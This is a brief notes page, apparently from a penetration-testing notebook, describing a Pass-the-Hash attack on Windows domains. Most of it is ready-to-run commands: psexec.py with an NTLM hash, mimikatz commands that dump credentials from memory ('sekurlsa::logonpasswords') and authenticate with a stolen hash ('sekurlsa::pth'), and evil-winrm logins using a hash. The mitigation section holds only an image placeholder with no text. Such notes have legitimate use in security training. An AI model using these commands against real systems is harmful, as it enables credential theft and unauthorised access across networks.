**What is Pass The Hash Attack?**

in this attack we extract NTLM Hashes and use it to login to different user accounts to gain access to other resources in the network.

**Requirements:**

- NTLM Hashes of user accounts
- [CrackMapExec](Active_Directory_Enumeration--PowerView--Commands--Get-NetGroup_16.html) Tool

# **Attack Process:**

Run this Command to access the

`./psexec.py administrator@192.168.0.47 -hashes aad3b435b51404eeaad3b435b51404ee:7fe86e0c585f2b6a2bad86034dac5648`

![[Pasted image 20251219200807.png]]

__ **Other Process** __

_we can use this mimikatz technique to do this or we can use previously captured hashes_

Step 1: Stealing the Password Hash

**mimikatz commands:**

`.\mimikatz.exe`

`privilege::debug`

`sekurlsa::logonpasswords`

Step 2: Authentication through the stolen password.

`.\mimikatz.exe`

`sekurlsa::pth /user:Alice /domain:domain.com /ntlm:a0c8746a6efc7782c7c19c55185145be`

___________________________________

evil-winRM

`evil-winrm -u Alice -H a0c8746a6efc7782c7c19c55185145be -i 192.168.52.146`

# **Mitigation:**

![[Pasted image 20251219200811.png]]